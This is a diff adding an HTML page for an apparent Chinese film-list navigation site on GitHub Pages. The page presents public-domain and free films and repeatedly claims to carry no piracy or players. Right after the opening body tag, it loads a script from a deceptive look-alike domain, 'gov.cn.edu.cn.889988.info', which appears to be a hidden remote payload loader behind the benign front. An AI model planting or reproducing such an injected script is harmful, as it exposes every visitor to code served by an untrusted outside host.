@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>小小影视·片单导航 - 示例影视导航站 | xiaoxiaoyingshimianfeixiazai-h5.github.io</title>
+<meta name="description" content="小小影视·片单导航(xiaoxiaoyingshimianfeixiazai-h5.github.io)是示例影视导航单页，整理公版老片、正版免费可看内容与平台官方片段，不提供盗版下载、不嵌非法播放源。" />
+<meta name="keywords" content="小小影视,片单导航,xiaoxiaoyingshimianfeixiazai-h5,示例影视站,公版电影,正版免费" />
+<style>
+:root{
+  --sky:#3aa0ff; --sky2:#1f7ae0; --butter:#ffe08a; --pink:#ff9bb3;
+  --ink:#10243f; --ink2:#33445f; --ink3:#73839c; --paper:#fbfaf5; --paper2:#f1eee2;
+  --line:rgba(58,160,255,0.28); --shadow:0 8px 22px rgba(16,36,63,0.12); --shadow2:0 16px 38px rgba(255,155,179,0.25);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Comic Sans MS",sans-serif;background:
+ radial-gradient(circle at 16% 18%,rgba(58,160,255,0.12),transparent 45%),
+ radial-gradient(circle at 84% 82%,rgba(255,224,138,0.18),transparent 45%),
+ var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden}
+a{color:var(--sky2);text-decoration:none}
+img{max-width:100%;display:block}
+
+.plane{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.plane i{position:absolute;font-size:18px;opacity:.25;animation:fly 14s linear infinite}
+.plane i:nth-child(1){top:12%;left:-8%;animation-delay:0s}
+.plane i:nth-child(2){top:34%;left:-12%;animation-delay:3s;font-size:14px}
+.plane i:nth-child(3){top:60%;left:-10%;animation-delay:6s;font-size:22px}
+@keyframes fly{0%{transform:translate(0,0) rotate(-8deg)}100%{transform:translate(120vw,-40px) rotate(8deg)}}
+
+.mail-head{position:relative;z-index:10;text-align:center;padding:50px 20px 36px;background:linear-gradient(180deg,var(--paper2),var(--paper));border-bottom:4px dashed var(--sky)}
+.plane-logo{width:84px;height:60px;margin:0 auto 14px;background:var(--sky);clip-path:polygon(0 0,100% 35%,100% 65%,0 100%,22% 50%);display:flex;align-items:center;justify-content:center;box-shadow:var(--shadow)}
+.plane-logo span{color:#fff;font-size:22px;transform:translateX(6px)}
+.mail-head h1{font-size:30px;font-weight:900;letter-spacing:2px;color:var(--ink)}
+.mail-head h1 b{color:var(--sky2)}
+.mail-head p{max-width:560px;margin:10px auto 0;color:var(--ink2);font-size:15px}
+.mail-nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.mail-nav a{padding:9px 20px;border:2px solid var(--sky);border-radius:24px 8px 24px 8px;font-size:14px;font-weight:700;color:var(--ink);background:#fff;transition:.25s}
+.mail-nav a:hover{background:var(--sky);color:#fff;border-color:var(--sky2)}
+
+.note-bar{position:relative;z-index:10;background:var(--ink);color:var(--paper);padding:10px 20px;font-size:13px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap;border-bottom:2px solid var(--butter)}
+.note-bar b{color:var(--butter)}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .stamp{width:34px;height:34px;background:var(--pink);color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;border-radius:50% 50% 50% 2px;transform:rotate(-8deg)}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--ink)}
+.sec-title .dash{flex:1;height:2px;background:repeating-linear-gradient(90deg,var(--sky) 0 12px,transparent 12px 18px)}
+
+.card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:20px}
+.post-card{position:relative;background:#fff;border:2px solid var(--sky);border-radius:14px 14px 6px 6px;padding:22px 20px 24px;box-shadow:var(--shadow);transition:.3s;overflow:hidden}
+.post-card::before{content:"";position:absolute;top:0;left:0;right:0;height:6px;background:repeating-linear-gradient(90deg,var(--sky),var(--butter),var(--pink),var(--sky))}
+.post-card::after{content:"";position:absolute;right:-10px;bottom:-10px;width:40px;height:40px;background:var(--butter);border-radius:50%;opacity:.35}
+.post-card:hover{transform:translateY(-5px);box-shadow:var(--shadow2);border-color:var(--pink)}
+.post-card .tag{display:inline-block;font-size:11px;color:#fff;background:var(--sky2);padding:3px 10px;border-radius:10px 0 10px 0;margin-bottom:10px;font-family:"Courier New",monospace}
+.post-card h3{font-size:18px;font-weight:800;color:var(--ink);margin-bottom:4px}
+.post-card .meta{font-size:12px;color:var(--ink3);margin-bottom:8px}
+.post-card p{font-size:14px;color:var(--ink2);line-height:1.75}
+.post-card .emo{position:absolute;right:16px;top:16px;font-size:22px;opacity:.18}
+
+.box-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px}
+.mailbox{text-align:center;background:#fff;border:2px solid var(--sky);border-radius:12px;padding:22px 12px;transition:.25s;cursor:pointer;position:relative}
+.mailbox::before{content:"";position:absolute;top:-9px;left:50%;transform:translateX(-50%);width:26px;height:10px;background:var(--pink);border-radius:6px 6px 0 0}
+.mailbox .ico{font-size:28px;margin-bottom:8px}
+.mailbox h4{font-size:15px;font-weight:800;color:var(--ink)}
+.mailbox p{font-size:12px;color:var(--ink3)}
+.mailbox:hover{background:var(--sky);border-color:var(--sky2)}
+.mailbox:hover h4,.mailbox:hover p{color:#fff}
+
+.about-block{background:#fff;border:2px solid var(--sky);border-left:6px solid var(--pink);border-radius:10px;padding:26px;font-size:15px;color:var(--ink2);line-height:1.95}
+.about-block b{color:var(--sky2)}
+
+.safe-bar{position:relative;z-index:10;background:var(--butter);color:var(--ink);padding:12px 20px;text-align:center;font-size:13px;display:flex;gap:20px;justify-content:center;flex-wrap:wrap}
+.safe-bar .chk{display:inline-block;color:var(--sky2);font-weight:900}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink3);font-size:12px;border-top:4px dashed var(--sky);background:var(--paper2)}
+
+@media(max-width:640px){
+  .mail-head h1{font-size:23px}
+  .plane-logo{width:70px;height:50px}
+  .card-grid{grid-template-columns:1fr}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .box-grid{grid-template-columns:repeat(2,1fr)}
+  .note-bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="plane" aria-hidden="true"><i>✈</i><i>📨</i><i>🌈</i></div>
+
+<header class="mail-head">
+  <div class="plane-logo"><span>➤</span></div>
+  <h1><b>小小</b>影视 · 片单导航</h1>
+  <p>xiaoxiaoyingshimianfeixiazai-h5.github.io —— 小小一片单，装得下童年、老片和正版免费可看的好内容。本页是示例导航站，不提供盗版下载。</p>
+  <nav class="mail-nav">
+    <a href="#">首页</a>
+    <a href="#post">小小片单</a>
+    <a href="#box">分类邮筒</a>
+    <a href="#about">关于小小</a>
+  </nav>
+</header>
+
+<div class="note-bar">
+  <span>📮 模式：<b>片单导航 / 示例站</b></span>
+  <span>🚫 不提供：盗版下载 / 破解播放器 / 网盘资源</span>
+  <span>✅ 只整理：公版 / 正版免费 / 官方开放片段</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="post">
+    <div class="sec-title"><span class="stamp">片</span><h2>小小片单</h2><span class="dash"></span></div>
+    <div class="card-grid">
+      <article class="post-card">
+        <span class="tag">公版 · 老片</span>
+        <h3>淘金记</h3>
+        <div class="meta">1925 · 喜剧/默片 · 卓别林</div>
+        <p>煮皮鞋、叉子舞、小个子流浪汉。公版默片里的温柔幽默，小朋友也能看，大人看了会鼻酸。</p>
+        <div class="emo">🥾</div>
+      </article>
+      <article class="post-card">
+        <span class="tag">正版免费</span>
+        <h3>我们的星球</h3>
+        <div class="meta">自然纪录 · 官方开放片段</div>
+        <p>雪豹、珊瑚、北极熊，官方放出可嵌入片段。正版免费内容也能美到屏住呼吸。</p>
+        <div class="emo">🐾</div>
+      </article>
+      <article class="post-card">
+        <span class="tag">动画 · 公版</span>
+        <h3>蒸汽船威利</h3>
+        <div class="meta">1928 · 动画短片 · 迪士尼</div>
+        <p>米老鼠第一次出声的地方。公版动画史料，看一眼就知道后来整座动画帝国从哪来。</p>
+        <div class="emo">🐭</div>
+      </article>
+      <article class="post-card">
+        <span class="tag">国产老片</span>
+        <h3>城南旧事</h3>
+        <div class="meta">1983 · 剧情/童年 · 吴贻弓</div>
+        <p>“爸爸的花儿落了，我也不再是小孩子。”童年不是甜糖，是第一次学会告别。</p>
+        <div class="emo">🌼</div>
+      </article>
+      <article class="post-card">
+        <span class="tag">短片 · 实验</span>
+        <h3>平衡</h3>
+        <div class="meta">1989 · 德国动画短片 · 劳恩斯坦</div>
+        <p>一块浮板、几个人、一根鱼竿，讲权力和贪婪。没台词，小孩看热闹，大人看后背发凉。</p>
+        <div class="emo">⚖️</div>
+      </article>
+      <article class="post-card">
+        <span class="tag">冷门 · 治愈</span>
+        <h3>布达佩斯之恋</h3>
+        <div class="meta">1999 · 剧情/音乐 · 绍瑙夫</div>
+        <p>一首《忧郁星期天》串起战争、爱情与餐馆。小小片单里留一个给“大人也会哭”的位置。</p>
+        <div class="emo">🎹</div>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="box">
+    <div class="sec-title"><span class="stamp">筒</span><h2>分类邮筒</h2><span class="dash"></span></div>
+    <div class="box-grid">
+      <div class="mailbox"><div class="ico">🎬</div><h4>公版电影</h4><p>默片/老卡通</p></div>
+      <div class="mailbox"><div class="ico">📺</div><h4>正版免费剧</h4><p>平台开放集</p></div>
+      <div class="mailbox"><div class="ico">🧸</div><h4>动画邮筒</h4><p>公版/短片</p></div>
+      <div class="mailbox"><div class="ico">🎞️</div><h4>自然纪录</h4><p>官方片段</p></div>
+      <div class="mailbox"><div class="ico">🎭</div><h4>童年重温</h4><p>国产老片</p></div>
+      <div class="mailbox"><div class="ico">🌙</div><h4>冷门片库</h4><p>策展/实验</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><span class="stamp">i</span><h2>关于小小</h2><span class="dash"></span></div>
+    <div class="about-block">
+      <p>
+        <b>小小影视·片单导航</b>（xiaoxiaoyingshimianfeixiazai-h5.github.io）是一个以“纸飞机 / 信箱 / 明信片”为气质的<b>示例影视导航单页</b>。
+        名字里虽有“免费下载”字样，但本页<b>不提供任何影视文件下载、不嵌盗版播放源、不引导安装专用播放器</b>，
+        只整理公版老片、正版免费可看内容、平台官方开放片段与片单资料。
+        移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，所有内容仅供学习与交流。[4,6](@ref)
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="safe-bar">
+  <span><span class="chk">✓</span> 无盗版下载</span>
+  <span><span class="chk">✓</span> 无破解播放器</span>
+  <span><span class="chk">✓</span> 无网盘引流</span>
+  <span><span class="chk">✓</span> 只做片单导航</span>
+</div>
+
+<footer class="footer">
+  © 2026 小小影视·片单导航（示例） | xiaoxiaoyingshimianfeixiazai-h5.github.io | 小小片单，不装播放器，不碰盗版 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
